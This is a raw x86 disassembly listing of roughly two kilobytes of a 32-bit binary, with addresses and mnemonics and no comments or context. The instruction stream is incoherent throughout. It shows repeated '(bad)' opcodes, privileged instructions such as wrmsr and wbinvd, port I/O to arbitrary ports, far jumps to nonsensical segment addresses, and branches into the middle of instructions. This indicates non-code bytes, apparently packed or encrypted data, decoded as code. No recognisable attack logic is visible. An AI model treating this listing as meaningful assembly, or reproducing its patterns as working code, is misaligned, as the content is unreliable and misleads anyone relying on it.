  4136e0:	lods   eax,DWORD PTR ds:[esi]
  4136e1:	retf   0x5792
  4136e4:	int3   
  4136e5:	push   edx
  4136e6:	mov    esi,0x7547c3e3
  4136eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136ec:	ret    0x6f14
  4136ef:	and    eax,DWORD PTR [esi-0x32]
  4136f2:	loope  0x413741
  4136f4:	xchg   BYTE PTR ds:0x5ff2a8dc,ch
  4136fa:	enter  0x40fe,0xe0
  4136fe:	loope  0x4136f1
  413700:	(bad)  
  413702:	inc    ecx
  413703:	xchg   ecx,eax
  413704:	dec    esi
  413705:	cmp    al,0xcb
  413707:	jge    0x413708
  413709:	push   ecx
  41370a:	add    eax,0x9b964369
  41370f:	add    al,BYTE PTR [esi-0x13]
  413712:	mov    ds:0xa05b44d7,al
  413717:	sar    BYTE PTR [ebx+0x56217505],1
  41371d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41371e:	pushf  
  41371f:	mov    cl,0x9e
  413721:	call   0xcf758691
  413726:	arpl   WORD PTR ds:0x2c7ec8a2,bx
  41372c:	dec    ebx
  41372d:	xchg   esi,eax
  41372e:	fs clc 
  413730:	dec    esp
  413731:	push   0x4ab45a55
  413736:	lods   eax,DWORD PTR ds:[esi]
  413737:	wrmsr  
  413739:	add    ecx,0x4b
  41373c:	fadd   QWORD PTR [ebp+esi*1-0x16]
  413740:	mov    al,0xe3
  413742:	sub    BYTE PTR [ebx+0x2a],0x27
  413746:	adc    dh,BYTE PTR [edi+0x71]
  413749:	dec    esp
  41374a:	loope  0x4137b3
  41374c:	fcom   QWORD PTR [edx]
  41374e:	retf   
  41374f:	xor    BYTE PTR [esi+0x12],ah
  413752:	pop    es
  413753:	jge    0x4137d1
  413755:	push   es
  413756:	jne    0x413756
  413758:	cmp    BYTE PTR [esi],ah
  41375a:	test   DWORD PTR [ebx+0x67],0x99c13900
  413761:	mov    edi,0xc152c82c
  413766:	xchg   esp,eax
  413767:	pop    esi
  413768:	pop    ecx
  413769:	push   edx
  41376a:	sub    eax,0xcae39c61
  41376f:	pop    eax
  413770:	fs jmp 0x9f4706b8
  413776:	adc    ah,BYTE PTR [eax-0x7c]
  413779:	sbb    BYTE PTR [ecx+0x64],bh
  41377c:	xchg   esp,eax
  41377d:	push   esp
  41377e:	je     0x4137b2
  413780:	div    edi
  413782:	sahf   
  413783:	fucomp st(7)
  413785:	icebp  
  413786:	push   es
  413787:	shl    BYTE PTR [ebx-0x41],0x78
  41378b:	push   ebp
  41378c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378d:	sbb    al,0xd6
  41378f:	adc    eax,0xe4c9ea36
  413794:	push   esp
  413795:	and    edx,eax
  413797:	push   0x2459f013
  41379c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41379d:	stos   DWORD PTR es:[edi],eax
  41379e:	mov    BYTE PTR ds:0x82b37f70,dl
  4137a4:	lods   eax,DWORD PTR ds:[esi]
  4137a5:	push   ss
  4137a6:	push   edi
  4137a7:	rcr    BYTE PTR [edx+edi*2+0x15],0xde
  4137ac:	dec    edi
  4137ad:	xchg   edi,eax
  4137ae:	cmp    al,0x3c
  4137b0:	aas    
  4137b1:	not    DWORD PTR [esi+eiz*1-0x2e]
  4137b5:	leave  
  4137b6:	dec    eax
  4137b7:	xchg   ebp,eax
  4137b8:	mov    ecx,0x6719ec22
  4137bd:	mov    ecx,0x150fddcc
  4137c2:	cwde   
  4137c3:	push   0xe3d38ec0
  4137c8:	xchg   BYTE PTR [ebx-0x1ed1f29c],al
  4137ce:	push   ebx
  4137cf:	loopne 0x413850
  4137d1:	sub    DWORD PTR [eax],edi
  4137d3:	adc    al,0xc9
  4137d5:	push   cs
  4137d6:	jecxz  0x41375e
  4137d8:	mov    ds:0xa31b183e,al
  4137dd:	xchg   esp,eax
  4137de:	xor    BYTE PTR [esi],al
  4137e0:	xlat   BYTE PTR ds:[ebx]
  4137e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137e2:	xchg   esp,eax
  4137e3:	xchg   ebx,eax
  4137e4:	sub    dh,bl
  4137e6:	inc    DWORD PTR [eax-0x790dc17c]
  4137ec:	(bad)  
  4137ed:	jle    0x41383e
  4137ef:	enter  0x8b3a,0xb3
  4137f3:	sti    
  4137f4:	pop    ecx
  4137f5:	xor    ebx,DWORD PTR ds:0x38e2175a
  4137fb:	xchg   esp,eax
  4137fc:	xor    BYTE PTR [esi],0x6
  4137ff:	sar    BYTE PTR [ebp-0x78],1
  413802:	inc    ebp
  413803:	inc    edi
  413804:	mov    BYTE PTR [edi+0x3222625e],bh
  41380a:	(bad)  
  41380b:	sahf   
  41380c:	push   edx
  41380d:	add    ecx,DWORD PTR [ebx+ebp*4]
  413810:	pop    es
  413811:	mov    ebx,0x64a9546
  413816:	lods   al,BYTE PTR ds:[esi]
  413817:	in     al,0xa6
  413819:	retf   0x10f4
  41381c:	(bad)  
  41381d:	shl    DWORD PTR [ebp-0x7c2347e0],1
  413823:	cmp    al,0x72
  413825:	and    ebx,DWORD PTR [ebx-0x4a]
  413828:	xchg   edi,eax
  413829:	adc    eax,0x27f0e20b
  41382e:	xchg   ebx,eax
  41382f:	scas   al,BYTE PTR es:[edi]
  413830:	rcl    BYTE PTR [edi+0x44],cl
  413833:	mov    ds:0x25b72ed0,al
  413838:	data16 cld 
  41383a:	inc    edi
  41383b:	lahf   
  41383c:	mov    eax,ds:0x14aee4c8
  413841:	aaa    
  413842:	ror    edx,cl
  413844:	sbb    al,0xb2
  413846:	adc    ecx,DWORD PTR [eax+ebx*2]
  413849:	dec    edi
  41384a:	je     0x41385f
  41384c:	lods   al,BYTE PTR ds:[esi]
  41384d:	xor    eax,0x3e891ea4
  413853:	div    BYTE PTR [ebx]
  413855:	sti    
  413856:	sub    al,0x92
  413858:	out    0xb6,eax
  41385a:	das    
  41385b:	push   ss
  41385c:	sub    DWORD PTR [edx+edx*1-0x4c320ea3],0xffffffb0
  413864:	push   ds
  413865:	gs inc esi
  413867:	xor    ch,dh
  413869:	sub    bl,BYTE PTR [ebx+0x15a01bff]
  41386f:	xchg   ebx,eax
  413870:	pusha  
  413871:	mov    edi,0xc4a0d9bb
  413876:	inc    ebx
  413877:	push   esp
  413878:	pop    ebp
  413879:	mov    ah,dl
  41387b:	call   0xbbcb:0xa5e6e4a6
  413882:	lock jmp 0x4138b7
  413885:	adc    BYTE PTR [edi+0x4bfa9e4d],ch
  41388b:	sbb    ebp,DWORD PTR [edi]
  41388d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41388e:	jbe    0x4138e9
  413890:	scas   al,BYTE PTR es:[edi]
  413891:	pop    ss
  413892:	adc    eax,0xaebca2e7
  413897:	rcr    DWORD PTR [edx],cl
  413899:	sbb    esp,ebx
  41389b:	out    0x8c,al
  41389d:	int    0x27
  41389f:	jb     0x413868
  4138a1:	pop    eax
  4138a2:	and    BYTE PTR [eax],cl
  4138a4:	pop    ss
  4138a5:	mov    dl,0x8f
  4138a7:	ret    0x816b
  4138aa:	jb     0x4138ed
  4138ac:	adc    cl,BYTE PTR [esi-0x6d]
  4138af:	popf   
  4138b0:	jno    0x4138c2
  4138b2:	dec    esi
  4138b3:	adc    DWORD PTR [ebx-0x57686414],esp
  4138b9:	bound  ecx,QWORD PTR [edi-0x20]
  4138bc:	xchg   edx,eax
  4138bd:	sbb    eax,0x1f71b1c3
  4138c2:	xchg   edi,eax
  4138c3:	fdiv   DWORD PTR [esi+0x46490b0d]
  4138c9:	imul   ebx,DWORD PTR [esi+ebx*1],0x26
  4138cd:	repnz mov ebx,0xa88df308
  4138d3:	ret    
  4138d4:	jl     0x413902
  4138d6:	fwait
  4138d7:	fs (bad) 
  4138d9:	jecxz  0x413945
  4138db:	jmp    0xb1b:0x21cf8044
  4138e2:	add    edx,DWORD PTR [ebp+0x79aed627]
  4138e8:	mov    esp,0x7793efff
  4138ee:	shr    BYTE PTR [eax+0x5e],0xab
  4138f2:	cmp    ebx,DWORD PTR [ebp+0x6a]
  4138f5:	ror    DWORD PTR [ebx+ecx*1],1
  4138f8:	std    
  4138f9:	add    eax,0xa7eb0c39
  4138fe:	add    esp,DWORD PTR [ecx]
  413900:	outs   dx,BYTE PTR ds:[esi]
  413901:	cmp    esp,DWORD PTR [ebx-0x54]
  413904:	or     esp,DWORD PTR [eax]
  413906:	in     al,0x1c
  413908:	and    DWORD PTR [edi+0x1a],edi
  41390b:	xchg   ecx,eax
  41390c:	idiv   al
  41390e:	add    BYTE PTR [edi-0x39f1a7ae],0x86
  413915:	mov    WORD PTR [ebp-0x11],?
  413918:	or     eax,0xc61a7103
  41391d:	or     eax,0x427bf358
  413922:	adc    al,0x88
  413924:	mov    ebx,0xa3ea7cf9
  413929:	int    0x43
  41392b:	dec    ebp
  41392c:	mov    BYTE PTR [ecx+0x93333f8],bl
  413932:	sub    DWORD PTR [eax-0x3b5d7c4d],edx
  413938:	es ja  0x413931
  41393b:	leave  
  41393c:	or     cl,BYTE PTR [ebx]
  41393e:	scas   eax,DWORD PTR es:[edi]
  41393f:	stc    
  413940:	in     al,dx
  413941:	cs stos BYTE PTR es:[edi],al
  413943:	mov    BYTE PTR [ecx],bh
  413945:	pop    ds
  413946:	cmp    dl,BYTE PTR [eax-0x23]
  413949:	retf   0x49e3
  41394c:	mov    ds:0xc3cc4a12,eax
  413951:	(bad)  
  413952:	popa   
  413953:	cmp    bl,BYTE PTR [edi-0x1173ac90]
  413959:	xchg   edx,eax
  41395a:	imul   ebp,DWORD PTR [edi],0xdf6ebbe2
  413960:	add    eax,0x6501292c
  413965:	adc    BYTE PTR [ebp+0x23ba79cd],bh
  41396b:	xchg   edx,eax
  41396c:	or     BYTE PTR [eax+0x65],dh
  41396f:	xchg   esp,eax
  413970:	xchg   esi,eax
  413971:	pop    ss
  413972:	push   ss
  413973:	mov    cl,0x67
  413975:	sub    eax,0x74625217
  41397a:	pop    edi
  41397b:	retf   
  41397c:	add    ebx,esi
  41397e:	loopne 0x41397d
  413980:	xchg   edi,eax
  413981:	cli    
  413982:	mov    ah,0x22
  413984:	ffreep st(6)
  413986:	xchg   ecx,eax
  413987:	imul   ecx
  413989:	push   edx
  41398a:	(bad)  
  41398b:	clc    
  41398c:	test   ah,ah
  41398e:	aaa    
  41398f:	ja     0x413987
  413991:	jle    0x413989
  413993:	repz push 0xfffffff8
  413996:	sar    ebp,0xe8
  413999:	int3   
  41399a:	pop    ebx
  41399b:	mov    ebp,0xe6ab8c1
  4139a0:	sub    ah,BYTE PTR [edi]
  4139a2:	jge    0x4139db
  4139a4:	sbb    eax,0xdba42f5c
  4139a9:	in     eax,0x41
  4139ab:	pusha  
  4139ac:	loop   0x4139d2
  4139ae:	mov    ah,BYTE PTR [ebx+0x4b39341d]
  4139b4:	jp     0x413a07
  4139b6:	(bad)  [esi-0x2c2e3508]
  4139bc:	cmp    al,0xb4
  4139be:	inc    edx
  4139bf:	push   0x74
  4139c1:	jbe    0x4139ce
  4139c3:	sbb    eax,0xc35614d0
  4139c8:	dec    ebx
  4139c9:	lahf   
  4139ca:	lock mov edi,0x2ae44f07
  4139d0:	jecxz  0x413a3c
  4139d2:	cmp    eax,0x37cb8368
  4139d7:	or     eax,0x38182f7
  4139dc:	and    DWORD PTR [eax+0x3e],ecx
  4139df:	aas    
  4139e0:	push   esp
  4139e1:	mov    bl,0x14
  4139e3:	hlt    
  4139e4:	out    dx,eax
  4139e5:	and    edx,DWORD PTR [ebx-0x479384a0]
  4139eb:	sbb    eax,0xabf6fa1a
  4139f0:	(bad)  
  4139f1:	pop    ebp
  4139f2:	pop    ebp
  4139f3:	xchg   esi,eax
  4139f4:	imul   eax,eax,0xa25c32f3
  4139fa:	les    eax,FWORD PTR [edi]
  4139fc:	leave  
  4139fd:	sub    esi,DWORD PTR [edx-0xd44b173]
  413a03:	jecxz  0x413a79
  413a05:	div    BYTE PTR [ebp+0x13bd05c]
  413a0b:	mov    ch,0x99
  413a0d:	pop    ecx
  413a0e:	sahf   
  413a0f:	fiadd  WORD PTR [ebx]
  413a11:	arpl   WORD PTR [ebp+0x24],cx
  413a14:	popf   
  413a15:	xacquire xchg DWORD PTR [eax-0x36b54ffb],edi
  413a1c:	pmaxsw mm0,QWORD PTR [ebp+0x65]
  413a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a21:	imul   BYTE PTR [ebp+eax*1+0x375d5479]
  413a28:	xchg   edx,eax
  413a29:	add    DWORD PTR [ebp-0x1f9c642c],edi
  413a2f:	int3   
  413a30:	sbb    edi,DWORD PTR [ebp+0x1cedb20b]
  413a36:	or     al,0xc6
  413a38:	jg     0x413a05
  413a3a:	adc    ebx,edi
  413a3c:	stos   DWORD PTR es:[edi],eax
  413a3d:	xchg   DWORD PTR [ebx+0x1],ecx
  413a40:	inc    esp
  413a41:	adc    DWORD PTR [ebx+ebx*2],ecx
  413a44:	mov    DWORD PTR [esi],esp
  413a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a47:	stc    
  413a48:	int3   
  413a49:	jecxz  0x413a28
  413a4b:	arpl   WORD PTR ss:[esp+eiz*4],di
  413a4f:	retf   0xce78
  413a52:	sub    dh,ch
  413a54:	jl     0x413ad3
  413a56:	and    BYTE PTR [esi-0x54],bl
  413a59:	jne    0x4139f5
  413a5b:	xchg   esp,eax
  413a5c:	dec    edi
  413a5d:	push   cs
  413a5e:	data16 fwait
  413a60:	lea    ecx,[eax-0x25]
  413a63:	repz xor ah,BYTE PTR [ebp-0x16bc9b6a]
  413a6a:	xchg   esi,eax
  413a6b:	xor    BYTE PTR [ecx-0x5a3a02ec],bl
  413a71:	out    0x65,al
  413a73:	enter  0xfe80,0x5d
  413a77:	mov    fs,WORD PTR [edi+0x3864ee4c]
  413a7d:	ss into 
  413a7f:	adc    DWORD PTR ds:0xd671a1e7,esi
  413a85:	mov    esp,0x60b8058
  413a8a:	cmp    eax,0x1de1f970
  413a8f:	(bad)  
  413a90:	cs rep stos BYTE PTR es:[edi],al
  413a93:	iret   
  413a94:	div    BYTE PTR [eax-0x27]
  413a97:	or     eax,0x5d50c4db
  413a9c:	lods   al,BYTE PTR ds:[esi]
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	and    ch,ah
  413aa0:	mov    ch,0x57
  413aa2:	push   es
  413aa3:	shr    BYTE PTR [esi],cl
  413aa5:	out    dx,al
  413aa6:	add    bl,BYTE PTR [ebp-0xb]
  413aa9:	add    esi,edi
  413aab:	jne    0x413ac3
  413aad:	icebp  
  413aae:	out    0x78,al
  413ab0:	shl    cl,cl
  413ab2:	adc    al,0xf1
  413ab4:	sub    BYTE PTR [ebx-0x153c7ba],al
  413aba:	cmp    ah,BYTE PTR [ebp+0x3ab0fe6]
  413ac0:	push   0xfe4af48f
  413ac5:	mov    ebp,esp
  413ac7:	jne    0x413ad1
  413ac9:	imul   ebp,ebp,0x4a
  413acc:	in     eax,dx
  413acd:	iret   
  413ace:	ja     0x413a76
  413ad0:	cmp    al,0x40
  413ad2:	mov    WORD PTR [ebp-0x20],ss
  413ad5:	push   ecx
  413ad6:	ror    ch,0x9e
  413ad9:	xor    edi,edx
  413adb:	mov    ebp,0xbfe693d5
  413ae0:	mov    dh,0x44
  413ae2:	mov    cl,0xbf
  413ae4:	push   esi
  413ae5:	inc    ebx
  413ae6:	fwait
  413ae7:	sub    al,0x88
  413ae9:	xor    DWORD PTR ds:[edi-0x3c601a47],0xffffffb0
  413af1:	call   0x8861e842
  413af6:	leave  
  413af7:	ret    
  413af8:	push   edi
  413af9:	xchg   ecx,eax
  413afa:	das    
  413afb:	out    0xfe,eax
  413afd:	xchg   esp,eax
  413afe:	cmp    BYTE PTR ds:0xc416b76d,ah
  413b04:	add    edi,ebx
  413b06:	xor    ch,0x9e
  413b09:	sbb    ecx,0xb8893782
  413b0f:	pop    ebp
  413b10:	add    BYTE PTR [edi+ebp*2-0x13],ah
  413b14:	jns    0x413ad7
  413b16:	pop    ds
  413b17:	jae    0x413b7b
  413b19:	dec    ebp
  413b1a:	pushf  
  413b1b:	dec    ebp
  413b1c:	sub    DWORD PTR [eax+0x1c83d42b],esp
  413b22:	loop   0x413b41
  413b24:	(bad)  [edi-0x350098a9]
  413b2a:	mov    esp,0x3d70a97e
  413b2f:	sbb    BYTE PTR [ebx],dl
  413b31:	cmp    al,0x5c
  413b33:	clc    
  413b34:	xchg   esi,eax
  413b35:	test   al,0x5e
  413b37:	arpl   WORD PTR [edx],sp
  413b39:	fldz   
  413b3b:	clc    
  413b3c:	fsubr  st,st(5)
  413b3e:	popf   
  413b3f:	bound  ebp,QWORD PTR [edi-0x41fae89f]
  413b45:	xchg   esi,eax
  413b46:	xchg   esi,eax
  413b47:	in     eax,dx
  413b48:	pop    ss
  413b49:	and    BYTE PTR [edi+0x6a9d2b8d],0x6f
  413b50:	and    DWORD PTR [ecx+eiz*8-0x60],ecx
  413b54:	jns    0x413b0c
  413b56:	fimul  DWORD PTR [ecx-0xfa00bd2]
  413b5c:	enter  0x592a,0x91
  413b60:	add    BYTE PTR ds:0xa396c112,cl
  413b66:	call   FWORD PTR [edx]
  413b68:	sub    eax,0xe7f41727
  413b6d:	imul   edx,DWORD PTR [ecx-0x56],0xb762a10a
  413b74:	adc    ch,ah
  413b76:	add    BYTE PTR [ebp+0x27d6b021],0xe
  413b7d:	push   ebx
  413b7e:	jmp    0x588b0b5e
  413b83:	shl    DWORD PTR [ebx],0x25
  413b86:	in     al,0x39
  413b88:	cli    
  413b89:	popa   
  413b8a:	mov    esi,0xa4f0e8c2
  413b8f:	scas   eax,DWORD PTR es:[edi]
  413b90:	push   cs
  413b91:	(bad)  
  413b92:	scas   eax,DWORD PTR es:[edi]
  413b93:	int3   
  413b94:	fdivr  DWORD PTR [ecx]
  413b96:	jbe    0x413b47
  413b98:	and    al,0xa4
  413b9b:	sub    BYTE PTR [eax],ah
  413b9d:	gs pusha 
  413b9f:	je     0x413be6
  413ba1:	xchg   BYTE PTR [esi-0x77],bl
  413ba4:	mov    al,ds:0xfedcde60
  413ba9:	or     ch,BYTE PTR [eax-0x21]
  413bac:	mov    dh,0xae
  413bae:	cmc    
  413baf:	cli    
  413bb0:	mov    ds:0xc9f7177,eax
  413bb5:	jg     0x413bcb
  413bb7:	loope  0x413bcc
  413bb9:	adc    eax,0x7d9bedbc
  413bbe:	dec    ebp
  413bbf:	ja     0x413b8e
  413bc1:	dec    ebx
  413bc2:	das    
  413bc3:	pop    ebp
  413bc4:	jl     0x413c14
  413bc6:	std    
  413bc7:	pop    ebx
  413bc8:	cmovo  ebx,DWORD PTR [eax]
  413bcb:	and    DWORD PTR [esi],eax
  413bcd:	jg     0x413b7c
  413bcf:	test   DWORD PTR [edi],edx
  413bd1:	inc    edx
  413bd2:	sahf   
  413bd3:	inc    esp
  413bd4:	clc    
  413bd5:	ss mov bh,0x3d
  413bd8:	test   al,0x6
  413bda:	and    DWORD PTR [eax-0x6f],esi
  413bdd:	fwait
  413bde:	imul   esi,DWORD PTR [edi+ebp*4-0x795f0893],0xd8988b3c
  413be9:	call   0xbabf:0x7489529c
  413bf0:	aaa    
  413bf1:	dec    esi
  413bf2:	hlt    
  413bf3:	inc    ecx
  413bf4:	add    eax,0x6afbb7ab
  413bf9:	repz in eax,0x24
  413bfc:	inc    edi
  413bfd:	and    eax,0xb2937860
  413c02:	lea    esi,[esi-0xe873f22]
  413c08:	or     BYTE PTR ds:0x57835291,0x5e
  413c0f:	dec    edi
  413c10:	inc    ebp
  413c11:	mov    ebp,0x14a5148d
  413c16:	push   esp
  413c17:	imul   edi,DWORD PTR [esi],0xffffffb1
  413c1a:	stos   BYTE PTR es:[edi],al
  413c1b:	xor    eax,0xec5afced
  413c20:	jo     0x413c22
  413c22:	icebp  
  413c23:	scas   al,BYTE PTR es:[edi]
  413c24:	out    dx,eax
  413c25:	push   ebx
  413c26:	addr16 fwait
  413c28:	outs   dx,BYTE PTR ds:[esi]
  413c29:	or     al,0x1d
  413c2b:	call   0x3ce0:0x460d2592
  413c32:	aam    0x6d
  413c34:	fwait
  413c35:	cld    
  413c36:	dec    ebp
  413c37:	test   BYTE PTR [edi-0x65],al
  413c3a:	inc    ecx
  413c3b:	mov    eax,ds:0x928dfb34
  413c40:	mov    al,ds:0x7db47f94
  413c45:	xor    eax,DWORD PTR ds:0xe8510b2e
  413c4b:	call   0xae6c:0xd79a4c9c
  413c52:	cmp    DWORD PTR [ebp+esi*4+0x7d],0x65
  413c57:	imul   ebp,eax,0xffffffe7
  413c5a:	cs mov edi,0x34ed7720
  413c60:	fsubp  st(7),st
  413c62:	mov    DWORD PTR ds:0x19da2129,0x397591df
  413c6c:	out    dx,al
  413c6d:	mov    dh,0x4
  413c6f:	jmp    0x6f30:0xa1ca2959
  413c76:	and    dh,dh
  413c78:	test   DWORD PTR [edi+esi*2-0xe],0x900c56c0
  413c80:	arpl   WORD PTR [edx+0x60],cx
  413c83:	dec    eax
  413c84:	data16 das 
  413c86:	out    dx,eax
  413c87:	pop    esi
  413c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c89:	hlt    
  413c8a:	xor    edi,0xffffffb4
  413c8d:	mov    DWORD PTR [ebp+ecx*4-0x6cfacfec],edx
  413c94:	repnz mov WORD PTR [esi+0xdf14d62],?
  413c9b:	pop    esp
  413c9c:	test   dl,dh
  413c9e:	inc    ecx
  413c9f:	ret    
  413ca0:	das    
  413ca1:	mov    cl,0xf
  413ca3:	les    eax,FWORD PTR [eax-0x1a]
  413ca6:	lds    esp,FWORD PTR [ebx-0x345df215]
  413cac:	stc    
  413cad:	fadd   QWORD PTR [ecx]
  413caf:	jne    0x413ced
  413cb1:	addr16 cmp al,0xe6
  413cb4:	scas   al,BYTE PTR es:[edi]
  413cb5:	sub    BYTE PTR [edx-0x15],ah
  413cb8:	and    dl,0x2d
  413cbb:	mov    cl,0x70
  413cbd:	mov    ebp,0x12b707bb
  413cc2:	adc    DWORD PTR [ecx-0x629289a4],ecx
  413cc8:	jmp    DWORD PTR [ecx-0x623692c2]
  413cce:	pop    ebp
  413ccf:	xchg   ebp,eax
  413cd0:	xchg   ebx,eax
  413cd1:	fwait
  413cd2:	loope  0x413cc6
  413cd4:	cmp    al,BYTE PTR [esi+edx*4]
  413cd7:	pop    eax
  413cd8:	fcmove st,st(4)
  413cda:	pop    edx
  413cdb:	xor    al,0x47
  413cdd:	test   DWORD PTR [ebx-0x547e59dc],ebp
  413ce3:	ss dec ecx
  413ce5:	and    DWORD PTR [ebx],0xf5df15eb
  413ceb:	inc    edx
  413cec:	loop   0x413d0c
  413cee:	adc    ecx,ecx
  413cf0:	xchg   edx,eax
  413cf1:	js     0x413d47
  413cf3:	adc    al,0xb1
  413cf5:	push   esp
  413cf6:	inc    edi
  413cf7:	push   esi
  413cf8:	sub    eax,0xc641a8c9
  413cfd:	rcl    ebp,cl
  413cff:	pop    esp
  413d00:	es ds inc eax
  413d03:	out    0xda,al
  413d05:	sub    dl,cl
  413d07:	dec    ebx
  413d08:	iret   
  413d09:	or     dh,BYTE PTR [ecx]
  413d0b:	cwde   
  413d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d0d:	mov    edx,0xf7d0dbae
  413d12:	jg     0x413d69
  413d14:	push   cs
  413d15:	pop    ebx
  413d16:	(bad)  
  413d17:	in     eax,0x5
  413d19:	clc    
  413d1a:	leave  
  413d1b:	fwait
  413d1c:	in     al,dx
  413d1d:	xchg   ebp,eax
  413d1e:	into   
  413d1f:	xor    al,0xfd
  413d21:	shr    al,0x80
  413d24:	inc    ebp
  413d25:	inc    ebp
  413d26:	shr    BYTE PTR [edx-0x31ad2729],cl
  413d2c:	pop    esp
  413d2d:	mov    ch,BYTE PTR [ecx+esi*4]
  413d30:	es or  dl,dl
  413d33:	xchg   esp,eax
  413d34:	sub    eax,ebx
  413d36:	sar    DWORD PTR ds:0xae74f914,0x60
  413d3d:	aad    0xac
  413d3f:	arpl   WORD PTR [esi],ax
  413d41:	mov    al,ds:0xe8f52c62
  413d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d47:	xorps  xmm5,XMMWORD PTR [edx+0x6f]
  413d4b:	repnz push ds
  413d4d:	dec    edx
  413d4e:	push   ebx
  413d4f:	sub    al,0x79
  413d51:	(bad)  
  413d52:	or     edx,DWORD PTR [edi]
  413d54:	aad    0xa4
  413d56:	loope  0x413dc0
  413d58:	daa    
  413d59:	lods   al,BYTE PTR ds:[esi]
  413d5a:	mov    dl,BYTE PTR [eax+edi*2]
  413d5d:	js     0x413d74
  413d5f:	cs push edx
  413d61:	jle    0x413d22
  413d63:	xchg   esp,eax
  413d64:	cdq    
  413d65:	xchg   edi,eax
  413d66:	out    dx,eax
  413d67:	les    esi,FWORD PTR [eax]
  413d69:	jb     0x413de2
  413d6b:	stc    
  413d6c:	inc    esp
  413d6d:	ret    0xf88b
  413d70:	push   edi
  413d71:	es ja  0x413db5
  413d74:	cmp    DWORD PTR [edi+0x5166028d],ecx
  413d7a:	jle    0x413d5e
  413d7c:	mov    cs,WORD PTR [ecx-0x35e5dea]
  413d82:	rcr    edx,1
  413d84:	or     DWORD PTR [edi+0x58],ebx
  413d87:	jo     0x413d9e
  413d89:	sbb    al,0x58
  413d8b:	mov    esi,0xb1b75ba1
  413d90:	inc    ebx
  413d91:	xlat   BYTE PTR ds:[ebx]
  413d92:	icebp  
  413d93:	test   eax,0x78f128ae
  413d98:	sub    BYTE PTR [edi+0x4],cl
  413d9b:	leave  
  413d9c:	mov    edi,0xef924dd5
  413da1:	inc    ecx
  413da2:	pusha  
  413da3:	shl    DWORD PTR [esi+esi*4-0x4b],0x75
  413da8:	inc    eax
  413da9:	(bad)  
  413dab:	add    DWORD PTR [ecx-0x60],ecx
  413dae:	nop
  413daf:	clc    
  413db0:	retf   0xe4a4
  413db3:	mov    dh,0x39
  413db5:	dec    ebx
  413db6:	loop   0x413dc4
  413db8:	mov    ah,0xcf
  413dba:	adc    DWORD PTR [edx-0x6e],edi
  413dbd:	inc    esp
  413dbe:	int3   
  413dbf:	fdiv   DWORD PTR [ecx-0x16]
  413dc2:	and    DWORD PTR [edi],edx
  413dc4:	xchg   ebp,eax
  413dc5:	call   0x44866f1c
  413dca:	bswap  ebx
  413dcc:	(bad)  
  413dcd:	adc    ecx,ebx
  413dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dd0:	ins    BYTE PTR es:[edi],dx
  413dd1:	sti    
  413dd2:	xchg   edi,eax
  413dd3:	push   eax
  413dd4:	addr16 jge 0x413db1
  413dd7:	push   0xffffffad
  413dd9:	test   BYTE PTR [esi+ebx*1-0x26],al
  413ddd:	fdiv   DWORD PTR [esi-0x381929f7]
  413de3:	fst    DWORD PTR [ebx+0x77]
  413de6:	inc    eax
  413de7:	add    ebx,DWORD PTR [eax+0x7c9e7f8d]
  413ded:	je     0x413e01
  413def:	xchg   ebp,eax
  413df0:	add    eax,0xe1efb894
  413df5:	test   al,0x6b
  413df7:	ffree  st(4)
  413df9:	wbinvd 
  413dfb:	loop   0x413d92
  413dfd:	ficom  WORD PTR [edi+0x39a9b9f4]
  413e03:	ficomp WORD PTR [eax]
  413e05:	cmp    al,0x1d
  413e07:	ja     0x413e23
  413e09:	out    dx,eax
  413e0a:	not    DWORD PTR [ebx+0xee3664e]
  413e10:	add    bl,al
  413e12:	or     BYTE PTR [edx+0xd8761a1],bh
  413e18:	adc    esi,DWORD PTR [esi+edx*2+0x1fef88a5]
  413e1f:	leave  
  413e20:	xlat   BYTE PTR ds:[ebx]
  413e21:	mov    cl,0x18
  413e23:	add    BYTE PTR [ebx-0x37dd2790],cl
  413e29:	jle    0x413e61
  413e2b:	dec    edi
  413e2c:	cmp    DWORD PTR [edi+0x7fe45957],ecx
  413e32:	xor    ebx,DWORD PTR [edi-0x58]
  413e35:	loope  0x413e9b
  413e37:	jae    0x413dbd
  413e39:	imul   ebx,DWORD PTR [eax],0xffffffab
  413e3c:	add    BYTE PTR [esp+ecx*2+0x30],ch
  413e40:	stc    
  413e41:	and    al,0xbf
  413e43:	mov    ebp,0x9b419d9c
  413e48:	jo     0x413e0d
  413e4a:	xchg   esi,eax
  413e4b:	cwde   
  413e4c:	jp     0x413ea0
  413e4e:	adc    edi,DWORD PTR [ebx]
  413e50:	sbb    bl,BYTE PTR ds:0x86286eb9
  413e56:	push   ecx
  413e57:	cmp    DWORD PTR [ebx],esi
  413e59:	sti    
  413e5a:	std    
  413e5b:	push   ebx
  413e5c:	jmp    0x413e36
  413e5e:	mov    DWORD PTR [ebp-0x79],eax
  413e61:	pop    es
  413e62:	mov    BYTE PTR [ecx+0x28],dl
  413e65:	lock lea esp,[eax+eax*4]
  413e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e6a:	(bad)  
  413e6b:	cmp    dl,BYTE PTR [eax+0x5526c622]
  413e71:	out    0xd2,eax
  413e73:	pop    ss
  413e74:	pop    es
  413e75:	fucomip st,st(0)
  413e77:	inc    ebp
  413e78:	mov    cs,esp
  413e7a:	enter  0x2190,0x5f
  413e7e:	xchg   DWORD PTR [edi],eax
  413e80:	ficom  WORD PTR [ebx-0x1d863806]
  413e86:	dec    ebp
  413e87:	cdq    
  413e88:	mov    ecx,0x5c3e4a5e
  413e8d:	dec    edx
  413e8e:	aas    
  413e8f:	stos   DWORD PTR es:[edi],eax
  413e90:	mov    dh,0x6d
  413e92:	jmp    0xf9e4:0x7f0917a9
  413e99:	dec    edi
  413e9a:	sub    esp,DWORD PTR [eax-0x5aeccfd]
  413ea0:	pop    es
